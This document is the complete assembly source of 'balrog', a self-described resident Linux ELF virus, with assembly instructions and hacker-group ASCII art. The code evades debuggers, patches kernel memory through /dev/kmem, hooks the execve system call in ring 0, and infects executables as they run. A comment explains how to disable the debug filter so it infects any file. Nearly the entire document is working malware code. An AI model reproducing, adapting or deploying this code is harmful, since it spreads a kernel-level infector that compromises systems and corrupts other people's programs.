   ;                                                       _
   ;                                                              _( (~\
   ;       _ _                        /    hAckniX               ( \> > \
   ;   -/~/ / ~\                     :;   PienSteVo    \       _  > /(~\/
   ;  || | | /\ ;\                   |l      _____     |;     ( \/    > >
   ;  _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
   ; ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
   ;(((__   __ \\   \                  `>,% (\  (\./)8"         ;:'  i
   ;)))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
   ;((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
   ; )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
   ; |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
   ; |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
   ; ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'
   ;   ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
   ;      ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
   ; :       ;                     `.      "``::::::''    .'
   ;    ;                           `.   \_              /
   ;  ;       ;                       +:   ~~--  `:'  -';
   ;                                   `:         : .::/
   ;      ;   How'd ya like that?      ;;+_  :::. :..;;;
   ;                                   ;;;;;;,;;;;;;;;,;
   ;
   ; this is the first version of balrog resident virus
   ; the resident mecanism is inspired from the (wonderful) stoag virus
   ; I played with kernel symbol only for demonstrating the use
   ; of exported kernel symbolz
   ;
   ; the total size of the virus is not optimized
   ; I prefer write a source wich is more readable
   ;
   ;   features of this virus is:
   ;       - resident in ring0 mode ( accessing by /dev/kmem )
   ;       - using exported kernel symboles
   ;       - retrieving kernel API with crc32
   ;       - elf infection without tempory file
   ;       - antidebugging ( detecting if task is traced )
   ;
   ; to Assemble it:
   ;   nasm -f elf balrog.asm
   ;   ld -o balrog balrog.o

   bits 32
   global _start

   section .text

       %define SYS_exit 1
       %define SYS_read 3
       %define SYS_write 4
       %define SYS_open 5
       %define SYS_close 6
       %define SYS_execve 11
       %define SYS_seek 19
       %define SYS_ptrace 26
       %define SYS_brk 45
       %define SYS_sethostname 74
       %define SYS_munmap 91
       %define SYS_uname 109
       %define SYS_deprotect 125
       %define SYS_get_kernel_syms 130
       ; if u want to infect any file, put DEBUG to 0
       ; for demonstration only debug = 1
       ; then files to infect are filtred by sz_filter
       %define DEBUG 1
       %define ___BREAK___ int 3
       ;crc32 calculation
       %define CRC32_ 0C1A7F39Ah
       %define CRC32_init 09C3B248Eh

       %define OF ebp - delta      ; offset in user space
       %define KOF ebp - delta_ring0   ; offset in kernel space

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; Some CODEZZ...                               ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   _start:
       push    eax
       pushad

       ; anti debugging trick
       xor esi, esi
       xor eax, eax
       cdq
       xor ebx, ebx
       xor ecx, ecx
       inc edx
       mov eax, SYS_ptrace
       int 80h

       cmp eax, 0FFFFF000h ; is any tracer ?
       ja  near fuck_  ; yeah then fuck

           mov     ebx, dword[esp+40] ; get argv[0]
           call    delta
         delta:
           pop     ebp

           ; copy the virus body in the stack and exectute it!
           mov ecx, end_of_host - begin_host
       sub esp, ecx
       lea esi, [OF + begin_host]
       mov edi, esp
       rep movsb
       jmp esp

         begin_host:
       push    ebx
           lea ebx, [OF+_start]
           and ebx, 0FFFFF000h
           mov ecx, 4000h
           mov edx, 7
           mov eax, SYS_deprotect
           int 80h

       xor     ecx, ecx
           mov     eax, SYS_open ; open host file
       pop ebx
           int     80h

           cmp     eax, 0xfffff000
           ja  near fuck_

           push    eax ; (0) save host file descriptor

       mov     ebx, 0666h
           mov     eax, SYS_execve     ; check if already resident
           int     80h

           cmp     ebx, 0667h
           jz  RestoreHostCode     ; if already infected call host code

           call    GoResident      ; else call GoResident routine...
         RestoreHostCode:
           pop     ebx             ; (0) restore host file descriptor

           db  0b9h            ; mov ecx, xxxxxxxx
       bytes2seek: dd  00000000h
           call    lSeek           ; lSeek to host code in the end of host
                           ; file
       or  eax, eax        ; if eax=0 : first generation
           jnz go_on
           jmp dword[OF+first_generation]
         go_on:
           lea ecx, [OF+_start]
       push    ecx
           pop esi
           mov edx, _end-_start
       mov eax, SYS_read
           int 80h

           mov eax, SYS_close
           int 80h

       add esp, end_of_host - begin_host   ; free virus memory
       mov dword [esp+32], esi ; write entrypoint
       popad               ; restore all registers
       ret             ; go to host code !

         fuck_:
       xor     ebx, ebx
           mov     eax, SYS_exit
       int     80h
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * GoResident                              ;
   ; DESCR  * This is the main routine of the balrog virus            ;
   ;        * the execve call is hooked in ring0 area                         ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  *                                 ;
   ; OUTPUT *                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   GoResident:
           xor     ebx, ebx
       mov     eax, SYS_get_kernel_syms
           int     80h

       push    eax
       pop ecx         ; save in ecx nb of sym

       shl eax, 06h        ; eax*64
           sub     esp, eax        ;allocate some space for symbolz
           mov     dword[KernelSym], esp

           push    dword[KernelSym]
           pop     ebx
           mov     eax, SYS_get_kernel_syms ; get symbol table to memory pointed
           int     80h          ; by ebx

       lea esi, [OF+@@CRCZ]
       lea edi, [OF+@@Offsetz]
       call    GetAPIs         ; get all kernel api and symz !

       shl ecx, 06h
       add esp, ecx        ; restore stack...

       ; ---- open /dev/kmem for allocate kernel space ---- ;
           mov     ecx, 2;rw
       lea     ebx, [OF+DevKmemFile]
       mov     eax, SYS_open
           int     80h

           cmp eax,0xFFFFF000
       ja  near eof_res

           xchg    ebx, eax

           push    dword[OF+_sys_call_table]
           pop     edi

           lea     edx, [edi+SYS_execve*4]
           lea     ecx, [OF+ApiSysExecve]
       call    GetSyscall

           lea edx, [edi+SYS_sethostname*4]
           lea     ecx, [OF+ApiSysSethostname]
       call    GetSyscall

           lea edx, [edi+SYS_brk*4]
           lea     ecx, [OF+ApiSysBrk]
       call    GetSyscall

           lea edx, [edi+SYS_munmap*4]
           lea     ecx, [OF+ApiSysMunmap]
       call    GetSyscall

           lea edx, [edi+SYS_ptrace*4]
           lea     ecx, [OF+ApiSysPtrace]
       call    GetSyscall

           mov     ecx, dword[OF+ApiSysSethostname]
           call    lSeek

           mov     edx, EndOfAllocateKernelSpace-AllocateKernelSpace
           sub     esp, edx;reserve memory
           mov     ecx, esp
           mov     eax, SYS_read
           int     80h

           mov     ecx, dword[OF+ApiSysSethostname]
           call    lSeek

           lea     ecx, [OF+AllocateKernelSpace]
           mov     eax, SYS_write
           int     80h

           push    ebx
           mov     ecx, _end-_start ; amount of mem
           mov     ebx, dword[OF+_KMalloc] ; adr of kmalloc sym
           mov     eax, SYS_sethostname; execute KernelSpace routine !!
           int     80h
           pop     ebx

           mov     dword[OF+Kspace], eax ; @ of allocated kernel space
           push    eax
           pop     dword[OF+ExecveAdr]
           add     dword[OF+ExecveAdr], HookExecve-_start ; seek to kernelSpace
   routine

           mov     ecx, dword[OF+ApiSysSethostname] ;
           call    lSeek

           mov     ecx, esp
           mov     eax, SYS_write
           int     80h ;restore sethostname code

           add     esp, edx ;restore stack

           ;---- copy virus code and put its adr in sys_call_table ----
           mov     ecx, dword[OF+Kspace]
           call    lSeek

           lea     ecx, [OF+_start]
           mov     edx, _end-_start
           mov     eax, SYS_write
           int     80h ; write virus code in ring0 memory

           push    dword[OF+_sys_call_table]
           pop     edi

           lea     esi, [edi+SYS_execve*4];seek to sys_call_table[SYS_execve]
           xchg    esi, ecx
           call    lSeek

           mov     edx, dword 04h
           lea     ecx, [OF+ExecveAdr]
           mov     eax, SYS_write
           int     80h ; write the hook

           mov     eax, SYS_close
           int     80h ; close /dev/kmem
         eof_res:
       ret
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * GetSyscall                              ;
   ; DESCR  * find syscall in kernel_sym table                ;
   ;        *                                             ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  * EBX = file no of memory kmem                    ;
   ;      ECX = adr of memory to write syscall adr            ;
   ;      EDX = adr of syscall in kmem                    ;
   ; OUTPUT *                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   GetSyscall:
       push    ecx
           xchg    edx, ecx
           call    lSeek

           mov     edx, 4
           pop ecx
           mov     eax, SYS_read
           int     80h
       ret
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * GetAPIs                             ;
   ; DESCR  * find all Kernel APIs in a table                 ;
   ;        *                                             ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  * ESI = ptr to ze API crc32 table                 ;
   ;      EDI = ptr to ze API offsetz table                   ;
   ;      ECX = number of symbolz                     ;
   ; OUTPUT *                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   GetAPIs:
       call    GetAPI

       stosd           ; store offset of API
       add esi, 04h

       cmp byte[esi],0BBh
       jnz GetAPIs
       ret
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * GetAPI                              ;
   ; DESCR  * find Kernel API                         ;
   ;        *                                             ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  * ESI = adr of crc32 API to look for                  ;
   ;      ECX = number of symbolz                     ;
   ; OUTPUT * EAX = adr of sym or NULL if not found               ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
       KernelSym   dd  00000000h ; adr of kernel API table
   GetAPI:
       push    esi
           push    edi
       push    ecx

       xchg    esi,edi ; edi hold adr of crc32 api
       mov esi,dword[OF+KernelSym]
       add esi, 04h
         find_nxt:

           call    CRC32

       cmp eax, dword[edi] ;compare crc'z
           jz      found_sym

           add     esi, 64
           loop    find_nxt

         found_sym:
           or      ecx, ecx
           jnz get_sym
           xor     eax, eax
           pop     ecx
       pop edi
           pop     esi
           ret
         get_sym:
           mov     eax, dword[esi - 04h]
           pop     ecx
       pop edi
           pop     esi
           ret
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * AllocateKernelSpace                                             ;
   ; DESCR  * this routine reserves memory                                    ;
   ;        * it is overwritten by the virus over uname                       ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  *  first param adr of kmalloc sym                                 ;
   ;        *  2nd param amount of mem to alloacate                           ;
   ; OUTPUT *                                                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   AllocateKernelSpace:
           push    ebp
           push    ebx
           mov     ebp, esp

           mov     eax, dword[esp+0Ch] ; get kmalloc adr
           mov     ebx, dword[esp+10h] ; get amount to allocate

           push    dword 03h
           push    ebx
           call    eax ; kmalloc

           mov     esp, ebp
           pop     ebx
           pop     ebp
           ret
   EndOfAllocateKernelSpace:
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * HookExecve                                  ;
   ; DESCR  * this routine hooks execve syscall and run in ring 0 mode        ;
   ;        *                                                             ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  *                                 ;
   ; OUTPUT *                                                     ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   HookExecve:
       push    ebp
           push    ebx

           mov     ebx, dword[esp+0Ch]     ; get first parameter

           cmp     ebx, 0666h
           jnz     NotMySelf
           inc     dword[esp+0Ch]      ; return 0667h becoze it is the
           pop     ebx         ; residence mark
           pop     ebp
           xor     eax, eax
           ret

         NotMySelf:

       call    GetCurrentTask
       lea esi, [eax+18h]      ;get ptrace member of current task
       lodsd

       and eax, 01h        ; is any tracer ?
       jnz near jmp_syscall    ; yeah then fuck

           call    delta_ring0
         delta_ring0:
       pop     ebp

       ; do infection stuff
       %ifdef DEBUG
       mov     eax, dword[KOF+sz_filter]; while debugging infect
       cmp dword[ebx], eax     ; files wich begin with sz_filter
       jnz jmp_syscall

       pusha
       push    ebx
       call    @msg1
       db  "<1>try to infect %s ???",0ah,0
         @msg1:
       call    dword[KOF+_Printk]
       add esp, 08h
       popa
       %endif

       call    TryInfection

         jmp_syscall:
       pop     ebx
       pop     ebp

       db  068h            ; jmp to original sys_call
       ApiSysExecve: dd 00000000h  ; push ApiSysExecve
       ret

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; NAME   * TryInfection                                    ;
   ; DESCR  * this routine try to infect file being executed                  ;
   ;        * I try to play only with exported kernel symbolz             ;
   ;    *                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; INPUT  * ebx: name of the file                       ;
   ; OUTPUT *                                                 ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   TryInfection:
       push    dword 0
       push    dword 2h        ; open in O_RDWR mode
       push    ebx
       call    dword[KOF+_Open]    ; open up!
       add esp,0Ch

       cmp eax,0FFFFF000h
       ja  near open_fail

       mov dword[KOF+FileHandle], eax

       xor ecx, ecx
       inc ecx
       inc ecx
       push    ecx
       xor ebx, ebx
       push    ebx         ; offset is a long
       push    ebx         ; long...
       push    dword[KOF+FileHandle]
       call    dword[KOF+_LlSeek]  ; get file length
       add esp,10h

       mov dword[KOF+bytes2seek], eax

       xor eax, eax
       push    ebx ; offset = 0
       inc ebx
       push    ebx ; map shared = 01h
       inc ebx
       inc ebx
       push    ebx ; rw = 03h
       push    dword[KOF+bytes2seek]
       push    eax ; adr = 0h (auto)
       push    dword[KOF+FileHandle]
       call    dword[KOF+_MMap] ; map ze victim!
       add esp,18h

       cmp eax, 0FFFFF000h
       ja  near map_fail

       mov dword[KOF+MapHandle], eax
       push    eax
       pop esi

       %ifdef DEBUG
       pusha
       push    dword[KOF+bytes2seek]
       call    @msg_2
       db  "<1>fileLength=%d",0ah,0
         @msg_2:
       call    dword[KOF+_Printk]
       add esp, 08h
       popa
       %endif

         begin_infection:
       mov eax, dword[esi]
       add     eax, -464C457Fh
       jne near unmap_spce     ; is valid elf header ?

       movzx   eax, word [esi+28h] ; get elf header size
       mov ebx, dword [esi+18h]    ; get entry_point
       movzx   ecx, word [esi+2ch] ; get ph number
       movzx   edx, word [esi+2ah] ; get ph entry size

       push    esi
       pop edi                                 ; set edi to beginning of
           add edi, eax                            ; program header table
         nxt_phdr:
       mov eax, dword[edi+0ch]
       add eax, dword[edi+14h]
       cmp ebx, eax
       jb  got_phdr
       add edi, edx
       loop    nxt_phdr

       jmp unmap_spce                          ; there is no valid ph !

         got_phdr:
       mov esi, dword[esi+18h] ; get EIP
       sub esi, dword[edi+08h] ; get offsetsegment file offset
       push    esi         ; save offset from beginnig of psegment
           pop ebx         ; in ebx
       add esi, dword[KOF+MapHandle]; goto EIP in map

       mov eax, dword[KOF+_start]
       cmp dword[esi], eax
       jz  near unmap_spce     ;already infected

       mov eax, dword[edi+14h]     ; get segment size
       sub eax, ebx
       cmp eax, _end-_start
       jb  near unmap_spce     ; sgm too small

       xor eax, eax        ; create a stack frame
       push    eax
       call    dword[KOF+ApiSysBrk]    ; dynamically using data space
       add esp, 04h        ; of current process

       add eax, dword _end-_start  ; allocate _end-_start bytes
       push    eax
       call    dword[KOF+ApiSysBrk]
       add esp, 04h

       push    eax         ; (1) save adr of stack frame

       mov ebx, esi
       mov ecx, dword _end-_start
       xchg    eax, edi        ; getting allocated space
       rep movsb           ; write host code right now!

       xchg    ebx, edi
       lea esi, [KOF+_start]
       mov ecx, _end-_start
       rep movsb

       call    UnMapArea

       pop edx         ; (1) restore adr of stack frame

       mov esi, dword[KOF+FileHandle]
       lea esi, [esi+20h]
       push    esi         ; putting FileHandle->f_pos
       push    dword _end - _start
       push    edx         ; adr of allocated space
       push    dword[KOF+FileHandle]
       call    dword[KOF+_Write]   ; write host cod at EOF
       add esp, 10h

       %ifdef DEBUG
       pusha
       push    eax
       call    @msg2
       db  "<1>%d bytes written",0ah,0
         @msg2:
       call    dword[KOF+_Printk]
       add esp, 08h
       popa
       %endif

       jmp map_fail

         unmap_spce:
       call    UnMapArea
         map_fail:
       push    dword 0
       push    dword[KOF+FileHandle]
       call    dword[KOF+_Close]
       add esp,08h
         open_fail:
       ret

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; Some UTILZ...                                ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; get current task in ring0 mode
   GetCurrentTask:
       push    edx
       push    ecx
       push    ebp
       mov dword ebp, esp
       sub dword esp, 0x4
       mov ecx, 0xffffe000
       and dword ecx, esp
       mov dword [ebp+0xfc], ecx
       mov edx, dword [ebp+0xfc]
       mov dword eax, edx
       leave
       pop ecx
       pop edx
       retn
   ; unmap mmapped space
   UnMapArea:
       push    dword[KOF+bytes2seek]
       push    dword[KOF+MapHandle]
       call    dword[KOF+ApiSysMunmap] ; unmap space
       add esp, 08h
       ret
   ;lSeek fct
   lSeek:
       push    edx
           xor     edx, edx
           mov     eax, SYS_seek
           int     80h
           pop edx
           ret
   ; return crc32 calculation
   ; little hack of original
   ; this routine work with string like string_R (calculate only crc of string)
   ; as get_kernel_sym return
   CRC32:
       push    esi
       push    edx
       mov edx,CRC32_init
         next_byte:
       cmp word[esi], '_R'         ;end of ksym?
       jz  finish

       lodsb

       or  al,al               ;end of name ?
       jz  finish

       xor dl,al
       mov al,08h
         next_bit:
       shr edx,01h
       jnc no_change
       xor edx,CRC32_
         no_change:
       dec al
       jnz next_bit
       jmp next_byte
         finish:
       xchg    eax,edx             ;CRC32 to EAX
       pop edx
       pop esi
       ret
   end_of_host:

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; Some DATAZZ...                               ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;

       db "[hAckniX <@))>< PienSteVo]"


   ;API syscallz
   ApiSysSethostname       dd      00000000h
   ApiSysBrk           dd      00000000h
   ApiSysMunmap            dd      00000000h
   ApiSysPtrace            dd      00000000h

   ;kernel sym'z
   @@CRCZ:
   @sys_call_table         dd      875d6a47h;"sys_call_table",0
   @kmalloc            dd      364eb1cfh;"kmalloc",0
   @kfree              dd      0a93c7d3ah;"kfree",0
   @do_brk             dd      5a63f0b1h;"do_brk",0
   @mmap               dd      28b47165h;"do_mmap_pgoff",0
   @munmap             dd      0fe260533h;"do_munmap",0
   @read               dd      0ee9a23dch;"generic_file_read",0
   @write              dd      243db4e9h;"generic_file_write",0
   @open               dd      780d715ah;"filp_open",0
   @close              dd      69c43909h;"filp_close",0
   @llseek             dd      03d5198eh;"default_llseek",0
   @printk             dd      6c356a2eh;"printk",0
                   db      0BBh
   @@Offsetz:
   _sys_call_table         dd      00000000h
   _KMalloc            dd      00000000h
   _KFree              dd      00000000h
   _DoBrk              dd      00000000h
   _MMap               dd      00000000h
   _MunMap             dd      00000000h
   _Read               dd      00000000h
   _Write              dd      00000000h
   _Open               dd      00000000h
   _Close              dd      00000000h
   _LlSeek             dd      00000000h
   _Printk             dd      00000000h

   %ifdef DEBUG
   ;filter of filename to infect : 4 car only (1 dword)
   sz_filter           db      "./ha"
   %endif

   ; common data
   FileHandle          dd      00000000h
   FileLength          dd      00000000h
   MapHandle           dd      00000000h
   MapSize             dd      00000000h
   FileSize            dd      00000000h
   DevKmemFile         db      "/dev/kmem",0
   Kspace              dd      00000000h
   ExecveAdr           dd      00000000h

   _end:

   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   ; First generation                                                         ;
   ;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;
   first_msg   db  "this is balrog first generation stub!", 0ah, 0
   first_msg_len   dd  $ - first_msg

   first_generation    dd  $+4
       mov edx, dword [OF+first_msg_len]
       lea ecx, [OF+first_msg]
       mov ebx, 01;stdout
       mov eax,SYS_write
       int 80h

       mov eax,SYS_exit
       int 80h

   ;  _____                  ______       ___   ___
   ; /     \_  ______ __ __ /     /~|_ ___\_ \ /  /___
   ; |  _  /_|/  __  \  '  V  ___/  _/  __  \ '  /    \
   ; |  __/  |   ____/  |  |___  \  |   ____/   /  --  \
   ; |__| |__|\______/__|__|_____/__|\_____/\__/\______/
